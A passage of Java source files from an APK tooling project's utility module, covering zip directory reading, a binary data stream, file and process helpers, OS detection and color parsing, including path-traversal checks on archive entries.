    public ZipRODirectory(File file, String path) throws DirectoryException {
        try {
            mZipFile = new ZipFile(file);
        } catch (IOException ex) {
            throw new DirectoryException(ex);
        }
        mPath = path;
    }

    private ZipRODirectory(ZipFile zipFile, String path) {
        mZipFile = zipFile;
        mPath = path;
    }

    @Override
    protected void load() {
        mFiles = new LinkedHashSet<>();
        mDirs = new LinkedHashMap<>();

        int prefixLen = mPath.length();
        Enumeration<? extends ZipEntry> entries = mZipFile.entries();
        while (entries.hasMoreElements()) {
            ZipEntry entry = entries.nextElement();
            String name = entry.getName();

            if (name.equals(mPath) || !name.startsWith(mPath) || name.contains(".." + separator)) {
                continue;
            }

            String subname = name.substring(prefixLen);

            int pos = subname.indexOf(separatorChar);
            if (pos == -1) {
                if (!entry.isDirectory()) {
                    mFiles.add(subname);
                    continue;
                }
            } else {
                subname = subname.substring(0, pos);
            }

            if (!mDirs.containsKey(subname)) {
                mDirs.put(subname, new ZipRODirectory(mZipFile, mPath + subname + separator));
            }
        }
    }

    private ZipEntry getZipFileEntry(String name) throws DirectoryException {
        ZipEntry entry = mZipFile.getEntry(name);
        if (entry == null) {
            throw new PathNotExist("Entry not found: " + name);
        }
        return entry;
    }

    @Override
    protected InputStream getFileInputImpl(String name) throws DirectoryException {
        try {
            return mZipFile.getInputStream(new ZipEntry(mPath + name));
        } catch (IOException ex) {
            throw new PathNotExist(name, ex);
        }
    }

    @Override
    public long getSize(String name) throws DirectoryException {
        ZipEntry entry = getZipFileEntry(name);
        return entry.getSize();
    }

    @Override
    public long getCompressedSize(String name) throws DirectoryException {
        ZipEntry entry = getZipFileEntry(name);
        return entry.getCompressedSize();
    }

    @Override
    public int getCompressionLevel(String name) throws DirectoryException {
        ZipEntry entry = getZipFileEntry(name);
        return entry.getMethod();
    }

    @Override
    public void close() throws DirectoryException {
        try {
            mZipFile.close();
        } catch (IOException ex) {
            throw new DirectoryException(ex);
        }
    }
}

```

`brut.j.util/build.gradle.kts`:

```kts
dependencies {
    implementation(project(":brut.j.common"))
    implementation(libs.commons.io)
    implementation(libs.guava)
}

```

`brut.j.util/src/main/java/brut/util/BackgroundWorker.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class BackgroundWorker {
    private final ExecutorService mExecutor;
    private final List<Future<?>> mWorkerFutures;
    private volatile boolean mSubmitAllowed;

    public BackgroundWorker(int threads) {
        mExecutor = Executors.newFixedThreadPool(threads);
        mWorkerFutures = new ArrayList<>();
        mSubmitAllowed = true;
    }

    public void waitForFinish() {
        checkState();
        mSubmitAllowed = false;
        for (Future<?> future : mWorkerFutures) {
            try {
                future.get();
            } catch (InterruptedException | ExecutionException ex) {
                throw new RuntimeException(ex);
            }
        }
        mWorkerFutures.clear();
        mSubmitAllowed = true;
    }

    public void clearFutures() {
        mWorkerFutures.clear();
    }

    private void checkState() {
        if (!mSubmitAllowed) {
            throw new IllegalStateException("BackgroundWorker is not ready");
        }
    }

    public void shutdownNow() {
        mSubmitAllowed = false;
        mExecutor.shutdownNow();
    }

    public ExecutorService getExecutor() {
        return mExecutor;
    }

    public void submit(Runnable task) {
        checkState();
        mWorkerFutures.add(mExecutor.submit(task));
    }

    public <T> Future<T> submit(Callable<T> task) {
        checkState();
        Future<T> future = mExecutor.submit(task);
        mWorkerFutures.add(future);
        return future;
    }
}

```

`brut.j.util/src/main/java/brut/util/BinaryDataInputStream.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import com.google.common.io.ByteStreams;
import com.google.common.primitives.Ints;
import com.google.common.primitives.Longs;

import java.io.ByteArrayInputStream;
import java.io.DataInput;
import java.io.EOFException;
import java.io.FilterInputStream;
import java.io.InputStream;
import java.io.IOException;
import java.nio.ByteOrder;

public class BinaryDataInputStream extends FilterInputStream implements DataInput {
    private final ByteOrder mByteOrder;
    private final long mLimit;
    private long mPosition;
    private long mMark;

    public BinaryDataInputStream(byte[] in) {
        this(new ByteArrayInputStream(in), in.length);
    }

    public BinaryDataInputStream(byte[] in, ByteOrder bo) {
        this(new ByteArrayInputStream(in), bo, in.length);
    }

    public BinaryDataInputStream(InputStream in) {
        this(in, ByteOrder.LITTLE_ENDIAN, Long.MAX_VALUE);
    }

    public BinaryDataInputStream(InputStream in, long limit) {
        this(in, ByteOrder.LITTLE_ENDIAN, limit);
    }

    public BinaryDataInputStream(InputStream in, ByteOrder bo) {
        this(in, bo, Long.MAX_VALUE);
    }

    public BinaryDataInputStream(InputStream in, ByteOrder bo, long limit) {
        super(in);
        mByteOrder = bo;
        mLimit = limit;
        mMark = -1;
    }

    public ByteOrder order() {
        return mByteOrder;
    }

    public long limit() {
        return mLimit;
    }

    public long position() {
        return mPosition;
    }

    public long remaining() {
        return mLimit - mPosition;
    }

    public long jumpTo(long pos) throws IOException {
        long expected = pos - mPosition;
        if (expected == 0) {
            return 0;
        }
        if (expected < 0) {
            throw new IOException(String.format("Illegal backwards jump from %s to %s", mPosition, pos));
        }
        long skipped = skip(expected);
        if (skipped != expected) {
            throw new IOException(String.format("Jump failed: skipped %s bytes (expected: %s)", skipped, expected));
        }
        return skipped;
    }

    public void skipByte() throws IOException {
        //noinspection ResultOfMethodCallIgnored
        readByte();
    }

    public void skipShort() throws IOException {
        //noinspection ResultOfMethodCallIgnored
        readShort();
    }

    public void skipInt() throws IOException {
        //noinspection ResultOfMethodCallIgnored
        readInt();
    }

    public void skipLong() throws IOException {
        //noinspection ResultOfMethodCallIgnored
        readLong();
    }

    public byte[] readBytes(int len) throws IOException {
        byte[] buf = new byte[len];
        readFully(buf);
        return buf;
    }

    public short[] readShortArray(int len) throws IOException {
        short[] arr = new short[len];
        for (int i = 0; i < len; i++) {
            arr[i] = readShort();
        }
        return arr;
    }

    public int[] readIntArray(int len) throws IOException {
        int[] arr = new int[len];
        for (int i = 0; i < len; i++) {
            arr[i] = readInt();
        }
        return arr;
    }

    public long[] readLongArray(int len) throws IOException {
        long[] arr = new long[len];
        for (int i = 0; i < len; i++) {
            arr[i] = readLong();
        }
        return arr;
    }

    public String readAscii(int len) throws IOException {
        char[] buf = new char[len];
        int pos = 0;
        while (len-- > 0) {
            char ch = (char) readUnsignedByte();
            if (ch == 0) {
                break;
            }
            buf[pos++] = ch;
        }
        if (len > 0) {
            skipBytes(len);
        }
        return new String(buf, 0, pos);
    }

    public String readUtf16(int len) throws IOException {
        char[] buf = new char[len];
        int pos = 0;
        while (len-- > 0) {
            char ch = readChar();
            if (ch == 0) {
                break;
            }
            buf[pos++] = ch;
        }
        if (len > 0) {
            skipBytes(len * 2);
        }
        return new String(buf, 0, pos);
    }

    // DataInput

    @Override
    public void readFully(byte[] b) throws IOException {
        ByteStreams.readFully(this, b);
    }

    @Override
    public void readFully(byte[] b, int off, int len) throws IOException {
        ByteStreams.readFully(this, b, off, len);
    }

    @Override
    public int skipBytes(int n) throws IOException {
        return (int) skip(n);
    }

    @Override
    public boolean readBoolean() throws IOException {
        return readUnsignedByte() != 0;
    }

    @Override
    public byte readByte() throws IOException {
        return (byte) readUnsignedByte();
    }

    @Override
    public int readUnsignedByte() throws IOException {
        int b = read();
        if (b == -1) {
            throw new EOFException();
        }
        return b;
    }

    @Override
    public short readShort() throws IOException {
        return (short) readUnsignedShort();
    }

    @Override
    public int readUnsignedShort() throws IOException {
        byte b1 = readByte();
        byte b2 = readByte();
        return mByteOrder == ByteOrder.LITTLE_ENDIAN
            ? Ints.fromBytes((byte) 0, (byte) 0, b2, b1)
            : Ints.fromBytes(b1, b2, (byte) 0, (byte) 0);
    }

    @Override
    public char readChar() throws IOException {
        return (char) readUnsignedShort();
    }

    @Override
    public int readInt() throws IOException {
        byte b1 = readByte();
        byte b2 = readByte();
        byte b3 = readByte();
        byte b4 = readByte();
        return mByteOrder == ByteOrder.LITTLE_ENDIAN
            ? Ints.fromBytes(b4, b3, b2, b1)
            : Ints.fromBytes(b1, b2, b3, b4);
    }

    @Override
    public long readLong() throws IOException {
        byte b1 = readByte();
        byte b2 = readByte();
        byte b3 = readByte();
        byte b4 = readByte();
        byte b5 = readByte();
        byte b6 = readByte();
        byte b7 = readByte();
        byte b8 = readByte();
        return mByteOrder == ByteOrder.LITTLE_ENDIAN
            ? Longs.fromBytes(b8, b7, b6, b5, b4, b3, b2, b1)
            : Longs.fromBytes(b1, b2, b3, b4, b5, b6, b7, b8);
    }

    @Override
    public float readFloat() throws IOException {
        return Float.intBitsToFloat(readInt());
    }

    @Override
    public double readDouble() throws IOException {
        return Double.longBitsToDouble(readLong());
    }

    @Override
    public String readLine() throws IOException {
        throw new UnsupportedOperationException();
    }

    @Override
    public String readUTF() throws IOException {
        throw new UnsupportedOperationException();
    }

    // InputStream

    @Override
    public int read() throws IOException {
        if (remaining() == 0) {
            return -1;
        }
        int b = in.read();
        if (b != -1) {
            ++mPosition;
        }
        return b;
    }

    @Override
    public int read(byte[] b, int off, int len) throws IOException {
        long remain = remaining();
        if (remain == 0) {
            return -1;
        }
        if (len > remain) {
            len = (int) remain;
        }
        int read = in.read(b, off, len);
        if (read > 0) {
            mPosition += read;
        }
        return read;
    }

    @Override
    public long skip(long n) throws IOException {
        long remain = remaining();
        if (remain == 0) {
            return 0;
        }
        if (n > remain) {
            n = remain;
        }
        // For many reasons, skip() may end up skipping less bytes than requested. Try harder.
        long skipped = 0;
        long s;
        while (skipped < n && (s = in.skip(n - skipped)) > 0) {
            skipped += s;
        }
        mPosition += skipped;
        return skipped;
    }

    @Override
    public int available() throws IOException {
        return (int) Math.min(in.available(), remaining());
    }

    @Override
    public synchronized void mark(int readlimit) {
        // We can't throw an exception here, so mark even if mark isn't supported, since reset won't work anyway.
        in.mark(readlimit);
        mMark = mPosition;
    }

    @Override
    public synchronized void reset() throws IOException {
        if (!markSupported()) {
            throw new IOException("Mark not supported");
        }
        if (mMark == -1) {
            throw new IOException("Mark not set");
        }
        in.reset();
        mPosition = mMark;
    }
}

```

`brut.j.util/src/main/java/brut/util/BrutIO.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import org.apache.commons.io.IOUtils;

import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.InvalidPathException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.CRC32;

public final class BrutIO {

    private BrutIO() {
        // Private constructor for utility class.
    }

    public static byte[] readAndClose(InputStream in) throws IOException {
        try {
            return IOUtils.toByteArray(in);
        } finally {
            IOUtils.closeQuietly(in);
        }
    }

    public static void copyAndClose(InputStream in, OutputStream out) throws IOException {
        try {
            IOUtils.copy(in, out);
        } finally {
            IOUtils.closeQuietly(in);
            IOUtils.closeQuietly(out);
        }
    }

    public static long recursiveModifiedTime(File[] files) {
        long modified = 0;
        for (File file : files) {
            long submodified = recursiveModifiedTime(file);
            if (submodified > modified) {
                modified = submodified;
            }
        }
        return modified;
    }

    public static long recursiveModifiedTime(File file) {
        long modified = file.lastModified();
        if (file.isDirectory()) {
            File[] subfiles = file.listFiles();
            for (File subfile : subfiles) {
                long submodified = recursiveModifiedTime(subfile);
                if (submodified > modified) {
                    modified = submodified;
                }
            }
        }
        return modified;
    }

    public static CRC32 calculateCrc(InputStream in) throws IOException {
        CRC32 crc = new CRC32();
        int bytesRead;
        byte[] buffer = new byte[8192];
        while ((bytesRead = in.read(buffer)) != -1) {
            crc.update(buffer, 0, bytesRead);
        }
        return crc;
    }

    public static String sanitizePath(File baseDir, String path) throws InvalidPathException, IOException {
        if (path == null || path.isEmpty()) {
            throw new InvalidPathException(path, "Path is null or empty.");
        }

        Path origPath = Paths.get(path);
        if (origPath.isAbsolute()) {
            throw new InvalidPathException(path, "Absolute paths are not allowed.");
        }

        Path basePath = Paths.get(baseDir.getCanonicalPath());
        Path resolvedPath = basePath.resolve(origPath).normalize();
        if (!resolvedPath.startsWith(basePath)) {
            throw new InvalidPathException(path, "Path traverses outside the base directory");
        }

        return basePath.relativize(resolvedPath).toString();
    }
}

```

`brut.j.util/src/main/java/brut/util/Jar.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import brut.common.BrutException;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;

public final class Jar {
    private static final Map<String, File> sExtracted = new HashMap<>();

    private Jar() {
        // Private constructor for utility class.
    }

    public static File getResourceAsFile(Class<?> clz, String name) throws BrutException {
        return getResourceAsFile(clz, name, "brut_util_Jar_");
    }

    public static File getResourceAsFile(Class<?> clz, String name, String tmpPrefix) throws BrutException {
        File file = sExtracted.get(name);
        if (file == null) {
            file = extractToTmp(clz, name, tmpPrefix);
            sExtracted.put(name, file);
        }
        return file;
    }

    public static File extractToTmp(Class<?> clz, String name) throws BrutException {
        return extractToTmp(clz, name, "brut_util_Jar_");
    }

    public static File extractToTmp(Class<?> clz, String name, String tmpPrefix) throws BrutException {
        try (InputStream in = clz.getResourceAsStream(name)) {
            if (in == null) {
                throw new FileNotFoundException(name);
            }
            long suffix = ThreadLocalRandom.current().nextLong();
            suffix = suffix > Long.MIN_VALUE ? Math.abs(suffix) : 0;
            File fileOut = File.createTempFile(tmpPrefix, suffix + ".tmp");
            fileOut.deleteOnExit();

            BrutIO.copyAndClose(in, Files.newOutputStream(fileOut.toPath()));

            return fileOut;
        } catch (IOException ex) {
            throw new BrutException("Could not extract resource: " + name, ex);
        }
    }
}

```

`brut.j.util/src/main/java/brut/util/OS.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import brut.common.BrutException;
import brut.common.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public final class OS {
    private static final String TAG = "";

    private OS() {
        // Private constructor for utility class.
    }

    public static void mkdir(String dir) {
        mkdir(new File(dir));
    }

    public static void mkdir(File dir) {
        //noinspection ResultOfMethodCallIgnored
        dir.mkdirs();
    }

    public static void rmfile(String file) {
        rmfile(new File(file));
    }

    public static void rmfile(File file) {
        //noinspection ResultOfMethodCallIgnored
        file.delete();
    }

    public static void rmdir(String dir) {
        rmdir(new File(dir));
    }

    public static void rmdir(File dir) {
        if (!dir.isDirectory()) {
            return;
        }

        File[] files = dir.listFiles();
        if (files == null) {
            return;
        }

        for (File file : files) {
            if (file.isDirectory()) {
                rmdir(file);
            } else {
                rmfile(file);
            }
        }
        rmfile(dir);
    }

    public static void mvfile(String src, String dest) throws BrutException {
        mvfile(new File(src), new File(dest));
    }

    public static void mvfile(File src, File dest) throws BrutException {
        try {
            Files.move(src.toPath(), dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException ex) {
            throw new BrutException("Could not move file: " + src, ex);
        }
    }

    public static void cpfile(String src, String dest) throws BrutException {
        cpfile(new File(src), new File(dest));
    }

    public static void cpfile(File src, File dest) throws BrutException {
        if (!src.isFile()) {
            return;
        }

        try {
            Files.copy(src.toPath(), dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException ex) {
            throw new BrutException("Could not copy file: " + src, ex);
        }
    }

    public static void cpdir(String src, String dest) throws BrutException {
        cpdir(new File(src), new File(dest));
    }

    public static void cpdir(File src, File dest) throws BrutException {
        if (!src.isDirectory()) {
            return;
        }

        mkdir(dest);

        File[] files = src.listFiles();
        if (files == null) {
            return;
        }

        for (File file : files) {
            File destFile = new File(dest, file.getName());
            if (file.isDirectory()) {
                cpdir(file, destFile);
            } else {
                cpfile(file, destFile);
            }
        }
    }

    public static void exec(String[] cmd) throws BrutException {
        try {
            ProcessBuilder builder = new ProcessBuilder(cmd);
            Process ps = builder.start();

            new StreamForwarder(ps.getErrorStream(), "ERROR").start();
            new StreamForwarder(ps.getInputStream(), "OUTPUT").start();

            int exitValue = ps.waitFor();
            if (exitValue != 0) {
                throw new BrutException("Execution failed (exit code = " + exitValue + "): " + Arrays.toString(cmd));
            }
        } catch (IOException ex) {
            throw new BrutException("could not exec: " + Arrays.toString(cmd), ex);
        } catch (InterruptedException ex) {
            throw new BrutException("could not exec : " + Arrays.toString(cmd), ex);
        }
    }

    public static String execAndReturn(String[] cmd) {
        ExecutorService executor = Executors.newCachedThreadPool();
        try {
            ProcessBuilder builder = new ProcessBuilder(cmd);
            builder.redirectErrorStream(true);

            Process process = builder.start();
            StreamCollector collector = new StreamCollector(process.getInputStream());
            executor.execute(collector);
            process.waitFor(15, TimeUnit.SECONDS);
            executor.shutdownNow();

            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                Log.w(TAG, "Stream collector did not terminate.");
            }
            return collector.get();
        } catch (IOException | InterruptedException ignored) {
            return null;
        }
    }

    public static File createTempDirectory() throws BrutException {
        try {
            File tmp = File.createTempFile("BRUT", null);
            tmp.deleteOnExit();

            if (!tmp.delete()) {
                throw new BrutException("Could not delete tmp file: " + tmp.getAbsolutePath());
            }
            if (!tmp.mkdir()) {
                throw new BrutException("Could not create tmp dir: " + tmp.getAbsolutePath());
            }

            return tmp;
        } catch (IOException ex) {
            throw new BrutException("Could not create tmp dir", ex);
        }
    }

    private static class StreamForwarder extends Thread {
        private final InputStream mIn;
        private final String mType;

        public StreamForwarder(InputStream in, String type) {
            mIn = in;
            mType = type;
        }

        @Override
        public void run() {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(mIn))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (mType.equals("OUTPUT")) {
                        Log.i(TAG, line);
                    } else {
                        Log.w(TAG, line);
                    }
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    private static class StreamCollector implements Runnable {
        private final InputStream mIn;
        private final StringBuilder mBuffer;

        public StreamCollector(InputStream in) {
            mIn = in;
            mBuffer = new StringBuilder();
        }

        @Override
        public void run() {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(mIn))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    mBuffer.append(line).append('\n');
                }
            } catch (IOException ignored) {
            }
        }

        public String get() {
            return mBuffer.toString();
        }
    }
}

```

`brut.j.util/src/main/java/brut/util/OSDetection.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

public final class OSDetection {
    private static final String OS = System.getProperty("os.name").toLowerCase();
    private static final String BIT = System.getProperty("sun.arch.data.model").toLowerCase();

    private OSDetection() {
        // Private constructor for utility class.
    }

    public static boolean isWindows() {
        return OS.contains("win");
    }

    public static boolean isMacOSX() {
        return OS.contains("mac");
    }

    public static boolean isUnix() {
        return OS.contains("nix") || OS.contains("nux") || OS.contains("aix") || OS.contains("sunos");
    }

    public static boolean is64Bit() {
        if (isWindows()) {
            String arch = System.getenv("PROCESSOR_ARCHITECTURE");
            String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");

            return arch != null && arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64");
        }
        return BIT.equals("64");
    }

    public static String returnOS() {
        return OS;
    }
}

```

`brut.j.util/src/main/java/brut/util/TextUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

public final class TextUtils {
    private static final int SINGLE_PRECISION_BIAS = 127;
    private static final int SINGLE_PRECISION_EXP_MIN = -126;
    private static final int SINGLE_PRECISION_EXP_MAX = 127;
    private static final int FLOAT_NEGATIVE_MASK = 0x80000000;
    private static final int MANTISSA_EXPONENT_ADJUST_VALUE = 0xFFFFFF;
    private static final int DENORMAL_EXPONENT_ADJUST_VALUE = MANTISSA_EXPONENT_ADJUST_VALUE - 1;
    private static final long SCALAR_SHIFT_1 = 1L << 60;
    private static final long SCALAR_SHIFT_2 = 1L << 61;
    private static final long SCALAR_SHIFT_3 = 1L << 62;
    private static final long SCALAR_SHIFT_4 = 1L << 63;
    private static final long DEC_SIGNIFICAND_LEADING_BIT = 1L << 59;
    private static final int DEC_SIGNIFICAND_DOWN_SHIFT = 36;
    private static final long ROUND_VALUE = 1L << 35;

    private static final long[] POSITIVE_SIGNIFICANDS = {
        0X0800000000000000L, 0X0A00000000000000L, 0X0C80000000000000L, 0X0FA0000000000000L, 0X09C4000000000000L,
        0X0C35000000000000L, 0X0F42400000000000L, 0X0989680000000000L, 0X0BEBC20000000000L, 0X0EE6B28000000000L,
        0X09502F9000000000L, 0X0BA43B7400000000L, 0X0E8D4A5100000000L, 0X09184E72A0000000L, 0X0B5E620F48000000L,
        0X0E35FA931A000000L, 0X08E1BC9BF0400000L, 0X0B1A2BC2EC500000L, 0X0DE0B6B3A7640000L, 0X08AC7230489E8000L,
        0X0AD78EBC5AC62000L, 0X0D8D726B7177A800L, 0X0878678326EAC900L, 0X0A968163F0A57B40L, 0X0D3C21BCECCEDA10L,
        0X084595161401484AL, 0X0A56FA5B99019A5CL, 0X0CECB8F27F4200F3L, 0X0813F3978F894098L, 0X0A18F07D736B90BEL,
        0X0C9F2C9CD04674EDL, 0X0FC6F7C404581229L, 0X09DC5ADA82B70B59L, 0X0C5371912364CE30L, 0X0F684DF56C3E01BCL,
        0X09A130B963A6C115L, 0X0C097CE7BC90715BL, 0X0F0BDC21ABB48DB2L, 0X096769950B50D88FL
    };
    private static final int[] POSITIVE_SHIFTS = {
        0, 3, 6, 9, 13, 16, 19, 23, 26, 29, 33, 36, 39, 43, 46, 49, 53, 56, 59, 63, 66, 69, 73, 76, 79, 83, 86, 89,
        93, 96, 99, 102, 106, 109, 112, 116, 119, 122, 126
    };
    private static final long[] NEGATIVE_SIGNIFICANDS = {
        0X0CCCCCCCCCCCCCCCL, 0X0A3D70A3D70A3D70L, 0X083126E978D4FDF3L, 0X0D1B71758E219652L, 0X0A7C5AC471B47842L,
        0X08637BD05AF6C69BL, 0X0D6BF94D5E57A42BL, 0X0ABCC77118461CEFL, 0X089705F4136B4A59L, 0X0DBE6FECEBDEDD5BL,
        0X0AFEBFF0BCB24AAFL, 0X08CBCCC096F5088CL, 0X0E12E13424BB40E1L, 0X0B424DC35095CD80L, 0X0901D7CF73AB0ACDL,
        0X0E69594BEC44DE15L, 0X0B877AA3236A4B44L, 0X09392EE8E921D5D0L, 0X0EC1E4A7DB69561AL, 0X0BCE5086492111AEL,
        0X0971DA05074DA7BEL, 0X0F1C90080BAF72CBL, 0X0C16D9A0095928A2L, 0X09ABE14CD44753B5L, 0X0F79687AED3EEC55L,
        0X0C612062576589DDL, 0X09E74D1B791E07E4L, 0X0FD87B5F28300CA0L, 0X0CAD2F7F5359A3B3L, 0X0A2425FF75E14FC3L,
        0X081CEB32C4B43FCFL, 0X0CFB11EAD453994BL, 0X0A6274BBDD0FADD6L, 0X084EC3C97DA624ABL, 0X0D4AD2DBFC3D0778L,
        0X0AA242499697392DL, 0X0881CEA14545C757L, 0X0D9C7DCED53C7225L, 0X0AE397D8AA96C1B7L, 0X08B61313BBABCE2CL,
        0X0DF01E85F912E37AL, 0X0B267ED1940F1C61L, 0X08EB98A7A9A5B04EL, 0X0E45C10C42A2B3B0L, 0X0B6B00D69BB55C8DL,
        0X09226712162AB070L, 0X0E9D71B689DDE71AL
    };
    private static final int[] NEGATIVE_SHIFTS = {
        -4, -7, -10, -14, -17, -20, -24, -27, -30, -34, -37, -40, -44, -47, -50, -54, -57, -60, -64, -67, -70, -74,
        -77, -80, -84, -87, -90, -94, -97, -100, -103, -107, -110, -113, -117, -120, -123, -127, -130, -133, -137,
        -140, -143, -147, -150, -153, -157
    };

    private TextUtils() {
        // Private constructor for utility class.
    }

    public static String matchSuffix(CharSequence text, String... suffixes) {
        int len = text.length();
        if (len == 0 || suffixes.length == 0) {
            return null;
        }

        for (String suffix : suffixes) {
            int suffixLen = suffix.length();
            if (suffixLen == 0 || suffixLen > len) {
                continue;
            }
            boolean matched = true;
            for (int i = 0; i < suffixLen; i++) {
                if (text.charAt(len - suffixLen + i) != suffix.charAt(i)) {
                    matched = false;
                    break;
                }
            }
            if (matched) {
                return suffix;
            }
        }
        return null;
    }

    public static boolean isPrintableChar(char ch) {
        return (ch >= 0x20 && ch <= 0x7E) || (ch >= 0xA0 && ch <= 0xD7FF)
            || (ch >= 0xE000 && ch <= 0xFDCF) || (ch >= 0xFDF0 && ch <= 0xFFFD);
    }

    public static int parseHex(int codePoint) {
        if (codePoint >= '0' && codePoint <= '9') {
            return codePoint - '0';
        }
        if (codePoint >= 'A' && codePoint <= 'F') {
            return codePoint - 'A' + 10;
        }
        if (codePoint >= 'a' && codePoint <= 'f') {
            return codePoint - 'a' + 10;
        }
        return -1;
    }

    public static int parseColor(CharSequence text) throws NumberFormatException {
        return parseColor(text, 0, text.length());
    }

    public static int parseColor(CharSequence text, int start, int end) throws NumberFormatException {
        if (start > end || end > text.length()) {
            throw new IndexOutOfBoundsException();
        }
        if (start == end) {
            throw new NumberFormatException();
        }

        int i = start;
        if (text.charAt(i) != '#' || ++i == end) {
            throw new NumberFormatException();
        }

        int value = 0;

        switch (end - start) {
            case 4: // #RGB
                for (; i < end; i++) {
                    int hex = parseHex(text.charAt(i));
                    if (hex == -1) {
                        throw new NumberFormatException();
                    }
                    value = (value << 8) | (hex | (hex << 4));
                }
                value |= 0xFF000000;
                break;
            case 5: // #ARGB
                for (; i < end; i++) {
                    int hex = parseHex(text.charAt(i));
                    if (hex == -1) {
                        throw new NumberFormatException();
                    }
                    value = (value << 8) | (hex | (hex << 4));
                }
                break;
            case 7: // #RRGGBB
                for (; i < end; i++) {
                    int hex = parseHex(text.charAt(i));
                    if (hex == -1) {
                        throw new NumberFormatException();
                    }
                    value = (value << 4) | hex;
